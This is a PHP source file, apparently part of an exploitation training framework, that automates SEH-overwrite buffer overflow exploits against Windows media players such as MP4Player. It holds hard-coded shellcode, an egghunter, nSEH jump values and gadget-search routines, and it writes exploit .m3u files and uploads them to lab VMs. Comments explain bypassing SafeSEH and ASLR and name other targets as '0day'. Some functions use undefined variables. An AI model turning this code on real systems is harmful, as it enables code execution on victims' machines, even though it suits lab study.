<?php



/*



  $bin_name = new ret2seh4win("MP4Player.exe");
  $victime_host = "";
  $victime_port = "";
  $offset_seh = 1028 ;
  $dll = "ntdll.dll";
  $header = '';
  $shellcode_calc = '\xdb\xc0\x31\xc9\xbf\x7c\x16\x70\xcc\xd9\x74\x24\xf4\xb1\x1e\x58\x31\x78\x18\x83\xe8\xfc\x03\x78\x68\xf4\x85\x30\x78\xbc\x65\xc9\x78\xb6\x23\xf5\xf3\xb4\xae\x7d\x02\xaa\x3a\x32\x1c\xbf\x62\xed\x1d\x54\xd5\x66\x29\x21\xe7\x96\x60\xf5\x71\xca\x06\x35\xf5\x14\xc7\x7c\xfb\x1b\x05\x6b\xf0\x27\xdd\x48\xfd\x22\x38\x1b\xa2\xe8\xc3\xf7\x3b\x7a\xcf\x4c\x4f\x23\xd3\x53\xa4\x57\xf7\xd8\x3b\x83\x8e\x83\x1f\x57\x53\x64\x51\xa1\x33\xcd\xf5\xc6\xf5\xc1\x7e\x98\xf5\xaa\xf1\x05\xa8\x26\x99\x3d\x3b\xc0\xd9\xfe\x51\x61\xb6\x0e\x2f\x85\x19\x87\xb7\x78\x2f\x59\x90\x7b\xd7\x05\x7f\xe8\x7b\xca';
  $footer = '';
  $ext_file = "m3u";
  $exploit_size_max = 1800;
  $vmx = "$this->dir_vm/xp3/xp3.vmx";
  $bin_name->payload_stack_win_seh_pop_sc_after_only($offset_seh, $dll, $header, $shellcode_calc, $footer, $exploit_size_max, $vmx, $ext_file, $victime_host, $victime_port);


  exit();
  	
  $vmx = "$this->dir_vm/win7x86/win7x86.vmx";
  $this->win7x86 = new vm($vmx);
  $this->win7x86->vm2upload("$this->dir_c/ret2seh4win_poc.c", "$this->vm_tmp_win\\ret2seh4win_poc.c");

  */

 
/*
 * 	// chercher XOR, POP, POP, RET |  XOR EAX EAX, POP ??, POP ??, RET
	// !pvefindaddr noaslr
	// !pvefindaddr rop –m msvcr71.dll –n
	 
	  // check : jump: \x74\x06\x90\x90 | JE JUMP 
	    $asm = "je 0x06";$this->asm2hex($asm);
		$hex = '\x74\x06';$this->hex2asm($hex);
	  
	 
 * $this->titre("On Windows Seven");
 * $this->net("https://www.youtube.com/playlist?list=PL9F9E52502327B1CA");
 *
 * win32_exec – EXITFUNC=seh CMD=cmd -c http://ftp.exe -s foo.scripted_sequence; echo der fox hat die gans gezogen Size=205 Encoder=None http://metasploit.com
 *
 *
 * requette("nautilus $this->dir_tools/bof/SEH");pause();
 * $this->ssTitre("BulletProof FTP Client 2010");
 * important("0day - Last Version");
 * $this->net("http://www.bpftp.com/products/bpftpclient/windows/download");
 * requette("nautilus $this->dir_tools/bof/SEH");pause();
 *
 * $this->ssTitre("Haihaisoft Universal Player 1.5.8.0");
 * important("0day - Last Version");
 * $this->net("http://www.haihaisoft.com/hup.aspx");
 * requette("nautilus $this->dir_tools/bof/SEH");pause();
 *

 



 * 
 *
 * We use the Immunity !safeseh function to locate unprotected dll's from which a return address can be found.
 *
 *
 *

 *
 * SEH (Structured Exception Handling)
 *
 * Le SEH est comme son nom l'indique une structure pour gérer les handle d'exceptions. 
 * Concrètement, cela veut dire que quand une exception sera déclanchée,
 * le kernel l'enverra à la fonction KiUserExceptionDispatcher() contenue dans ntdll.dll. 
 * Cette fonction va récupérer un pointeur vers le dernier handle afin de sauter dessus.
 *
 * Un SEH se compose de deux entiers stockés sur la pile. la structure est la suivant :
 * DWORD next_seh
 * DWORD seh_handle
 *
 * Ce sont deux pointeurs, le premier vers la structure SEH suivente, et le deuxième vers le code à exécuter en cas d'exeption.
 * De cette façon, les structures SEH forment une liste chainée.
 * Le next_seh de la dernière structure contient un 0xffffffff (-1) et le dernier SEH à etre empilé est pointé par fs[0].
   windbg> d fs[0]
   
 *pointer needs to be overwritten with a pop pop ret instruction (so the code would land at nseh, where you can do a short jump to go to your shellcode).
 Alternatively (or if you cannot find a pop pop ret instruction that does not sit in the address range of a loaded module belonging to the application)
 you can look at ESP/EBP, find the offset from these registers to the location of nseh, and look for addresses that would do

 	– call dword ptr [esp+nn]

 	– call dword ptr [ebp+nn]

 	– jmp dword ptr [esp+nn]

 	– jmp dword ptr[ebp+nn]

 	JMP/CALL DWORD PTR [ESP/EBP + offset] :
 	If there are no usable popad or POP+POP+RET instructions, you may try to jump directly to Next SEH on the stack by finding a JMP or CALL
 	instruction to an offset to ESP (+8, +14, +1c, +2c, etc) or EBP (+c, +24, +30, etc). Again, the AudioCoder application did not have any usable
 	instructions to demonstrate this technique.
 	The key to both of these options is that just as with POP+POP+RET you must select instructions from modules that were not compiled with
 	SafeSEH or the exploit will fail. You will also want to avoid addresses containing null bytes.

 * the first pop will take off 4 bytes from the stack
 * the second pop will take another 4 bytes from the stack
 * the ret will take the current value from the top of ESP(= the address of the next SEH, which was at ESP+8, but because of the 2 pop’s now sits at the top of the stack) and puts that in EIP.
 *



- check with Immunity "mona.py" plugin wich DLL was not compiled with ASLR and SafeSEH supports and has no bad chars (ex: null byte)
- !mona jmp -r esp -cm aslr=false,safeseh=false -cp nonull
- !mona findwild -s "pop r32#pop r32#retn" -cm safeseh=false,aslr=false -cp nonull
- PS: "mona" can limit the returning pointers to many criterias (avoiding bad chars!):
- "-cp asciiprint" (other: alphanum, numeric, upper, lower, uppernum, lowernum, etc)
- "-cpb '\x00\x0a\x0d'"
- Avoiding SafeSEH:
- check with Olly SafeSEH plugin wich DLL was not compiled with SafeSEH support
- to install it, just copy the "OllySSEH.dll" file to the "...\OllyDBG\Plugins\" folder
- check with Immunity "mona.py" plugin which DLL was not compiled with SafeSEH support
- !mona findwild -s "pop r32#pop r32#retn" -cm safeseh=false
- Avoiding/Bypassing ASLR:
- check with Immunity "mona.py" plugin which DLL was not compiled with ASLR support
- !mona jmp -r esp -cm aslr=false,rebase=false -cp nonull
- write down the modules base address, reboot the machine and compare with the new base address of the modules
- overwrite EIP partially (only with the less significant 2 bytes)



 *
 * //requette("vmrun -T ws -gu $login -gp $password copyFileFromGuestToHost $vmx \"C:\\\\tmp\\\\$programme_name.dlls\" $rep_path/$programme_name.dlls ");
 */

// ###################################################################################################################################

class ret2seh4win extends bin4win{
		var $rep_path ;
		var $prog_name;

	public function __construct($bin_name) {
		parent::__construct($bin_name);
		$bin_name = trim($bin_name);
		$this->rep_path = "$this->dir_tmp/ret2seh4win_".$bin_name;
		$this->prog_name = $bin_name;
		if (file_exists($this->rep_path)) system("rm -r $this->rep_path/*.* 2> /dev/null");
		if (!file_exists($this->rep_path)) system("mkdir $this->rep_path");

	}




function payload_stack_win_seh_pop_sc_before_jmp_ebx($programme, $offset_seh, $header, $shellcode_calc, $footer, $exploit_size_max, $vmx,  $ext_file, $victime_host, $victime_port) {

	$nop = "\\x90";
	
	$this->article("SEH POP SC before JMP EBX", "");
	
	$this->article("template", "python -c 'print \"\\x90\"*(\"OFFSET EIP-len(\"SHELLCODE\")-4)+\"SHELLCODE\"\"+\"SEH POP\"+\"\\x90\"*(\"EXPLOIT SIZE MAX\"-\"OFFSET EIP\"-4-4)+\"JMP EBX\"'");
	$shellcode_size = $this->hex2size($shellcode_calc);
	
	$offset_nop = $exploit_size_max - $offset_seh - 4 - 4;
	$header = "\"$nop\"*($offset_seh-$shellcode_size)+\"$shellcode_calc\"";
	$footer = "\"$nop\"*$offset_nop+\"$jmp_ebx\"";
	$SEHs_POP = file("$this->rep_path/$programme.seh.pop");
	
	foreach($SEHs_POP as $addr_seh_pop_sc_before_jmp_ebx){
		$addr_seh_pop_sc_before_jmp_ebx = trim($addr_seh_pop_sc_before_jmp_ebx);
		if (! empty($addr_seh_pop_sc_before_jmp_ebx)) {
			$this->article("SEH POP", $addr_seh_pop_sc_before_jmp_ebx);
			$seh_pop_sc_before_jmp_ebx = $this->hex2rev_32($addr_seh_pop_sc_before_jmp_ebx);
			$payload = "$header+\"$seh_pop_sc_before_jmp_ebx\"+$footer";
			// $payload = addcslashes($payload,'\\$');
			$query_seh_pop_sc_before_jmp_ebx = "python -c 'print $payload' | tee $this->rep_path/exploit_$programme" . "_seh_pop_sc_before_jmp_ebx_" . "$addr_seh_pop_sc_before_jmp_ebx" . "." . "$ext_file";
			$this->requette($query_seh_pop_sc_before_jmp_ebx);
			$this->requette("vmrun -T ws -gu $login -gp $password copyFileFromHostToGuest $vmx $this->rep_path/exploit_$programme" . "_seh_pop_sc_before_jmp_ebx_" . "$addr_seh_pop_sc_before_jmp_ebx" . "." . "$ext_file C:\\\\tmp\\\\exploit_$programme" . "_seh_pop_sc_before_jmp_ebx_" . "$addr_seh_pop_sc_before_jmp_ebx" . "." . "$ext_file");
		}
	}
}
function payload_stack_win_seh_pop_sc_before_jmpback($programme, $offset_seh, $header, $shellcode_calc, $footer, $exploit_size_max, $vmx,  $ext_file, $victime_host, $victime_port) {

	$nop = "\\x90";
	
	$this->article("SEH POP SC before jmpback", "");
	shellcode_hex2asm("\\xe9");
	shellcode_hex2asm("\\xeb");
	shellcode_asm2hex("jmp ");
	shellcode_asm2hex("jmp 0x06");
	shellcode_asm2hex("jmp 0x07");
	
	$this->article("template", "python -c 'print \"\\x90\"*(\"OFFSET EIP-len(\"SHELLCODE\"))+\"SHELLCODE\"\"+\"nSEH\"+\"POP POP RET\"+\"\\x90\"*(\"EXPLOIT SIZE MAX\"-\"OFFSET EIP\"-4-4)/2+\"JMP BACK\"+\"\\x90\"*(\"EXPLOIT SIZE MAX\"-\"OFFSET EIP\"-4-4)/2'");
	$shellcode_size = $this->hex2size($shellcode_calc);
	
	$jmpback_val = ($exploit_size_max - $offset_seh) / 2 + ($offset_seh - $shellcode_size) / 2;
	$addr_jmpback = dechex($jmpback_val);
	$jmpback = $this->hex2rev_32($addr_jmpback);
	
	$offset_nop = ($exploit_size_max - $offset_seh - 4) / 2;
	$header = "\"$nop\"*($offset_seh-$shellcode_size)+\"$egg\"+\"$shellcode_calc\"";
	$footer = "\"$nop\"*$offset_nop+\"$jmpback\"+\"$nop\"*$offset_nop";
	$SEHs_POP = file("$this->rep_path/$programme.seh.pop");
	
	foreach($SEHs_POP as $addr_seh_pop_sc_before_jmpback){
		$addr_seh_pop_sc_before_jmpback = trim($addr_seh_pop_sc_before_jmpback);
		if (! empty($addr_seh_pop_sc_before_jmpback)) {
			$this->article("SEH POP", $addr_seh_pop_sc_before_jmpback);
			$seh_pop_sc_before_jmpback = $this->hex2rev_32($addr_seh_pop_sc_before_jmpback);
			$payload = "$header+\"$seh_pop_sc_before_jmpback\"+$footer";
			// $payload = addcslashes($payload,'\\$');
			$query_seh_pop_sc_before_jmpback = "python -c 'print $payload' | tee $this->rep_path/exploit_$programme" . "_seh_pop_sc_before_jmpback_" . "$addr_seh_pop_sc_before_jmpback" . "." . "$ext_file";
			$this->requette($query_seh_pop_sc_before_jmpback);
			$this->requette("vmrun -T ws -gu $login -gp $password copyFileFromHostToGuest $vmx $this->rep_path/exploit_$programme" . "_seh_pop_sc_before_jmpback_" . "$addr_seh_pop_sc_before_jmpback" . "." . "$ext_file C:\\\\tmp\\\\exploit_$programme" . "_seh_pop_sc_before_jmpback_" . "$addr_seh_pop_sc_before_jmpback" . "." . "$ext_file");
		}
	}
}
// ###################################################################################################################################


function payload_stack_win_seh_all($programme, $offset_seh, $dll, $header, $shellcode_calc, $footer, $exploit_size_max, $vmx, $ext_file, $victime_host, $victime_port) {

	$this->payload_stack_win_seh_pop_sc_after_only($programme, $offset_seh, $dll, $header, $shellcode_calc, $footer, $exploit_size_max, $vmx, $ext_file, $victime_host, $victime_port);
	$this->payload_stack_win_seh_pop_sc_after_egghunter($programme, $offset_seh, $dll, $header, $shellcode_calc, $footer, $exploit_size_max, $vmx, $ext_file, $victime_host, $victime_port);
	$this->payload_stack_win_seh_pop_sc_before_egghunter($programme, $offset_seh, $dll, $header, $shellcode_calc, $footer, $exploit_size_max, $vmx, $ext_file, $victime_host, $victime_port);
	
	// not yet
	$this->payload_stack_win_seh_pop_sc_before_jmp_ebx($programme, $offset_seh, $header, $shellcode_calc, $footer, $exploit_size_max, $vmx,  $ext_file, $victime_host, $victime_port);
	$this->payload_stack_win_seh_pop_sc_before_jmpback($programme, $offset_seh, $header, $shellcode_calc, $footer, $exploit_size_max, $vmx,  $ext_file, $victime_host, $victime_port);
}
function payload_stack_win_seh_pop_sc_before_egghunter($programme, $offset_seh, $dll, $header, $shellcode_calc, $footer, $exploit_size_max, $vmx, $ext_file, $victime_host, $victime_port) {

	$nop = "\\x90";
	
	$this->article("SEH POP SC before egghunter", "");
	
	$this->article("template", "python -c 'print \"\\x90\"*(\"OFFSET EIP-len(\"EGG\")-len(\"SHELLCODE\"))+\"EGG\"+\"SHELLCODE\"\"+\"nSEH\"+\"POP POP RET\"+\"\\x90\"*(\"EXPLOIT SIZE MAX\"-\"OFFSET EIP\"-4-len(\"EGG HUNTER\")-8)+\"EGG HUNTER\"'");
	$shellcode_size = $this->hex2size($shellcode_calc);
	$header_size = $this->hex2size($header);
	$footer_size = $this->hex2size($footer);
	$offset_seh = $offset_seh + $header_size;
	// egghunter marker w00t
	$egghunter = '\x66\x81\xCA\xFF\x0F\x42\x52\x6A\x02\x58\xCD\x2E\x3C\x05\x5A\x74\xEF\xB8\x77\x30\x30\x74\x8B\xFA\xAF\x75\xEA\xAF\x75\xE7\xFF\xE7';
	$egghunter_size = $this->hex2size($egghunter);
	$egg = "w00tw00t";
	$nSEH = '\xeb\x06\x90\x90'; // Overwrite next seh, with jump forward (over the next 6 bytes) instruction
	$junk_repeat = $exploit_size_max - $offset_seh - $header_size - $footer_size - 4;
	
	$nop_repeat = $offset_seh - $header_size - 8 - $shellcode_size - 4;
	$header = "\"$header\"+\"$nop\"*$nop_repeat+\"$egg\"+\"$shellcode_calc\"+\"$nSEH\"";
	$footer = "\"$nop\"*32+\"$egghunter\"+\"\\x41\"*$junk_repeat+\"$footer\"";
	
	$dlls = vm_download_dll_programme($vmx,  $programme, $dll);
	if ($dll == "all") {
		foreach($dlls as $dll_name)
			$this->requette("msfpescan -i $this->rep_path/$programme.dll.$dll_name | grep -E \"SEHandler|DllCharacteristics\"; echo ; msfpescan -p $this->rep_path/$programme.dll.$dll_name  | grep -Po \"0x[0-9a-f-A-F]{6,8}\" | tee $this->rep_path/$programme.dll.$dll_name.seh.pop ");
		$this->requette("cat $this->rep_path/$programme.dll.*.seh.pop | sort -u |  tee $this->rep_path/$programme.dll.all.seh.pop");
	} else {
		$this->requette("msfpescan -i $this->rep_path/$programme.dll.$dll | grep -E \"SEHandler|DllCharacteristics\"; echo ; msfpescan -p $this->rep_path/$programme.dll.$dll  | grep -Po \"0x[0-9a-f-A-F]{6,8}\" | tee $this->rep_path/$programme.dll.$dll.seh.pop ");
	}
	$SEHs_POP = file("$this->rep_path/$programme.dll.$dll.seh.pop");
	$this->requette("cat $this->rep_path/$programme.dll.$dll.seh.pop | wc -l ");
	$this->pause();
	foreach($SEHs_POP as $addr_seh_pop_sc_before_egghunter){
		$addr_seh_pop_sc_before_egghunter = trim($addr_seh_pop_sc_before_egghunter);
		if (! empty($addr_seh_pop_sc_before_egghunter)) {
			$this->article("SEH POP", $addr_seh_pop_sc_before_egghunter);
			$seh_pop_sc_before_egghunter = $this->hex2rev_32($addr_seh_pop_sc_before_egghunter);
			$payload = "$header+\"$seh_pop_sc_before_egghunter\"+$footer";
			// $payload = addcslashes($payload,'\\$');
			$query_seh_pop_sc_before_egghunter = "python -c 'print $payload' > $this->rep_path/exploit_$programme" . "_seh_pop_sc_before_egghunter_" . "$addr_seh_pop_sc_before_egghunter" . "." . "$ext_file";
			$this->requette($query_seh_pop_sc_before_egghunter);
			$this->requette("vmrun -T ws -gu $login -gp $password copyFileFromHostToGuest $vmx $this->rep_path/exploit_$programme" . "_seh_pop_sc_before_egghunter_" . "$addr_seh_pop_sc_before_egghunter" . "." . "$ext_file C:\\\\tmp\\\\exploit_$programme" . "_seh_pop_sc_before_egghunter_" . "$addr_seh_pop_sc_before_egghunter" . "." . "$ext_file");
		}
	}
}
function payload_stack_win_seh_pop_sc_after_egghunter($programme, $offset_seh, $dll, $header, $shellcode_calc, $footer, $exploit_size_max, $vmx, $ext_file, $victime_host, $victime_port) {

	$nop = "\\x90";
	
	$this->article("SEH POP SC AFTER egghunter", "");
	$this->article("template", "python -c 'print \"ANYTHING\"*\"OFFSET EIP\"+\"nSEH\"+\"POP POP RET\"+\"\\x90\"*(\"EXPLOIT SIZE MAX\"-\"OFFSET EIP\"-4-len(\"SHELLCODE\")-len(\"EGG HUNTER\")-len(\"EGG\"))/2+\"EGG HUNTER\"+\"\\x90\"*(\"EXPLOIT SIZE MAX\"-\"OFFSET EIP\"-4-len(\"SHELLCODE\")-len(\"EGG HUNTER\")-len(\"EGG\"))/2+\"EGG\"+\"SHELLCODE\"'");
	$shellcode_size = $this->hex2size($shellcode_calc);
	$header_size = $this->hex2size($header);
	$footer_size = $this->hex2size($footer);
	$offset_seh = $offset_seh + $header_size;
	// egghunter marker w00t
	$egghunter = '\x66\x81\xCA\xFF\x0F\x42\x52\x6A\x02\x58\xCD\x2E\x3C\x05\x5A\x74\xEF\xB8\x77\x30\x30\x74\x8B\xFA\xAF\x75\xEA\xAF\x75\xE7\xFF\xE7';
	$egghunter_size = $this->hex2size($egghunter);
	$egg = "w00tw00t";
	$nSEH = '\xeb\x06\x90\x90'; // Overwrite next seh, with jump forward (over the next 6 bytes) instruction
	$junk_repeat = $offset_seh - $header_size - 4;
	$header = "\"$header\"+\"\\x41\"*$junk_repeat+\"$nSEH\"";
	$nop_repeat = $exploit_size_max - $offset_seh - 4 - 32 - $egghunter_size - 4 - $shellcode_size - $footer_size;
	$footer = "\"$nop\"*32+\"$egghunter\"+\"$nop\"*$nop_repeat+\"$egg\"+\"$shellcode_calc\"+\"$footer\"";
	
	$dlls = vm_download_dll_programme($vmx,  $programme, $dll);
	if ($dll == "all") {
		foreach($dlls as $dll_name)
			$this->requette("msfpescan -i $this->rep_path/$programme.dll.$dll_name | grep -E \"SEHandler|DllCharacteristics\"; echo ; msfpescan -p $this->rep_path/$programme.dll.$dll_name  | grep -Po \"0x[0-9a-f-A-F]{6,8}\" | tee $this->rep_path/$programme.dll.$dll_name.seh.pop ");
		$this->requette("cat $this->rep_path/$programme.dll.*.seh.pop | sort -u |  tee $this->rep_path/$programme.dll.all.seh.pop");
	} else {
		$this->requette("msfpescan -i $this->rep_path/$programme.dll.$dll | grep -E \"SEHandler|DllCharacteristics\"; echo ; msfpescan -p $this->rep_path/$programme.dll.$dll  | grep -Po \"0x[0-9a-f-A-F]{6,8}\" | tee $this->rep_path/$programme.dll.$dll.seh.pop ");
	}
	$SEHs_POP = file("$this->rep_path/$programme.dll.$dll.seh.pop");
	$this->requette("cat $this->rep_path/$programme.dll.$dll.seh.pop | wc -l ");
	$this->pause();
	foreach($SEHs_POP as $addr_seh_pop_sc_after_egghunter){
		$addr_seh_pop_sc_after_egghunter = trim($addr_seh_pop_sc_after_egghunter);
		if (! empty($addr_seh_pop_sc_after_egghunter)) {
			$this->article("SEH POP", $addr_seh_pop_sc_after_egghunter);
			$seh_pop_sc_after_egghunter = $this->hex2rev_32($addr_seh_pop_sc_after_egghunter);
			$payload = "$header+\"$seh_pop_sc_after_egghunter\"+$footer";
			// $payload = addcslashes($payload,'\\$');
			$query_seh_pop_sc_after_egghunter = "python -c 'print $payload' > $this->rep_path/exploit_$programme" . "_seh_pop_sc_after_egghunter_" . "$addr_seh_pop_sc_after_egghunter" . "." . "$ext_file";
			$this->requette($query_seh_pop_sc_after_egghunter);
			$this->requette("vmrun -T ws -gu $login -gp $password copyFileFromHostToGuest $vmx $this->rep_path/exploit_$programme" . "_seh_pop_sc_after_egghunter_" . "$addr_seh_pop_sc_after_egghunter" . "." . "$ext_file C:\\\\tmp\\\\exploit_$programme" . "_seh_pop_sc_after_egghunter_" . "$addr_seh_pop_sc_after_egghunter" . "." . "$ext_file");
		}
	}
}
function payload_stack_win_seh_pop_sc_after_only($offset_seh, $dll, $header, $shellcode_calc, $footer, $exploit_size_max, $vmx, $ext_file, $victime_host, $victime_port) {

	$nop = '\x90';

	$this->article("SEH POP SC AFTER ONLY", "");
	
	$this->article("template", "python -c 'print \"HEADER\"+\"ANYTHING\"*\"OFFSET EIP\"+\"nSEH\"+\"POP POP RET\"+\"\\x90\"*(\"EXPLOIT SIZE MAX\"-len(\"SHELLCODE\")-\"OFFSET EIP\"-4-4)+\"SHELLCODE\"+\"FOOTER\"'");
	$this->ssTitre("Size Shellcode Only");
	$shellcode_size = $this->hex2size($shellcode_calc);
	$this->ssTitre("Size Header Exploit");
	$header_size = $this->hex2size($header);
	$this->ssTitre("Size Footer Exploit");
	$footer_size = $this->hex2size($footer);
	$offset_seh = $offset_seh + $header_size;
	
	//$nSEH = '\xeb\x06\xff\xff';  // OK 
	$nSEH = '\xeb\x06\x90\x90'; // OK - Overwrite next seh, with jump forward (over the next 6 bytes) instruction
	$junk_repeat = $offset_seh - $header_size ;
	$header = "\"$header\"+\"\\x41\"*$junk_repeat+\"$nSEH\"";
	$nop_repeat = $exploit_size_max - $offset_seh - 8 - $shellcode_size - $footer_size;
	$footer = "\"$nop\"*30+\"$shellcode_calc\"+\"\\x42\"*($nop_repeat-12)+\"$footer\"";
	
	
	$vm_machine = new VM($vmx);
	$tab_pop2ret = $vm_machine->vm4win4pop2ret($this->rep_path,$this->prog_name,$dll);
	
	
	foreach($tab_pop2ret as $addr_seh_pop_sc_after_only){
		$addr_seh_pop_sc_after_only = trim($addr_seh_pop_sc_after_only);
		if (! empty($addr_seh_pop_sc_after_only)) {
			$this->article("SEH POP", $addr_seh_pop_sc_after_only);
			$seh_pop_sc_after_only = $this->hex2rev_32($addr_seh_pop_sc_after_only);
			$payload = "$header+\"$seh_pop_sc_after_only\"+$footer";
			// $payload = addcslashes($payload,'\\$');
			$exploit_local = "$this->rep_path/exploit_ret2seh4win_$this->prog_name" . "_seh_pop_sc_after_only_" . "$addr_seh_pop_sc_after_only" . "." . "$ext_file";
			//$this->payload2check4norme("`python -c 'print $payload'`","");
			$query_seh_pop_sc_after_only = "python -c 'print $payload' > $exploit_local";
			$this->requette($query_seh_pop_sc_after_only);
		}
	}
	$this->ssTitre("Compressing and Uploading Exploits");
	$exploit_archive = "exploit_ret2seh4win_$this->prog_name" . "_seh_pop_sc_after_only.tar";
	$this->requette("cd $this->rep_path/; tar -cf $exploit_archive exploit_ret2seh4win_$this->prog_name" . "_seh_pop_sc_after_only_*.$ext_file");
	
	
	$file = "$this->rep_path/$exploit_archive";
	$dest = "$vm_machine->vm_tmp_win\\\\$exploit_archive";
	$vm_machine->vm2upload($file, $dest);
}



}
?>